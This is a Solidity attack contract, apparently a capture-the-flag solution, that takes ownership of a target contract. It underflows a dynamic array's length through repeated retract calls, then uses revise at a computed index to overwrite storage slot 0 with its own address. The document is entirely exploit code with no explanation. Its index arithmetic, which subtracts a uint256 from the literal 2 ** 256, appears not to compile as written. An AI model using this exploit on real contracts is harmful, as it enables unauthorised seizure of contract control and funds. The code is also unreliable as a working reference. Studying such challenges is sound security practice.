pragma solidity ^0.5.0;

contract AttackerAlien {
    function computeSlot2() pure internal returns (uint256) {
        bytes32 hash = keccak256(abi.encodePacked(bytes32(1)));
        return uint256(hash);
    }

    function attack(address payable _alien) public {
        // Make contact
        (bool success, ) = _alien.call(abi.encodeWithSignature("makeContact()"));
        require(success, "Failed to make contact");

        // Push 3 elements
        for (uint i = 0; i < 3; i++) {
            (success, ) = _alien.call(abi.encodeWithSignature("record(bytes32)", bytes32(i)));
            require(success, "Failed to record");
        }

        // Retract 4 times
        for (uint i = 0; i < 4; i++) {
            (success, ) = _alien.call(abi.encodeWithSignature("retract()"));
            require(success, "Failed to retract");
        }

        // Calculate index for storage overwrite
        uint256 K = computeSlot2();
        uint256 i = (2 ** 256 - K) % (2 ** 256);

        // Overwrite owner slot
        (success, ) = _alien.call(abi.encodeWithSignature("revise(uint256,bytes32)", i, bytes32(uint256(uint160(address(this))))) );
        require(success, "Attack failed");
    }
}
